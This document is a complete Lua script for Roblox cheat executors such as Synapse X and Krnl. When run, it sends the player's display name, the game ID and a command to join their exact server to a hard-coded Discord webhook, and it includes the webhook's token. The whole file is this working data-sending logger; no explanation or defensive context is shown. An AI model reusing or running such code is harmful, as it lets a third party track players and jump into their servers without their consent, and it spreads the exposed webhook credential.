local exploit = syn and "Synapse X" or KRNL_LOADED and "Krnl" or "Unknown Exploit"

local url = "https://discord.com/api/webhooks/1057272639879643246/OLZN7xU6JBBQB49rjsdd9KKRP8J7JlYLrw-2c7_EStP8tDf13wugDupIEXztPbNdf3xD"

local data = {["embeds"] = {{["title"] = ('game:GetService("TeleportService"):TeleportToPlaceInstance(') .. game.PlaceId .. ',"' .. game.JobId .. '")',["description"] = " Game: https://www.roblox.com/games/" .. game.PlaceId .. "/ Name: " .. game.Players.LocalPlayer.DisplayName .." ",["type"] = "rich",["color"] = tonumber(0x7269da)}}}

local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {["content-type"] = "application/json"}

local wh = {Url = url, Body = newdata, Method = "POST", Headers = headers}

request = http_request or request or HttpPost or syn.request

request(wh) -- sends the request to the webhook
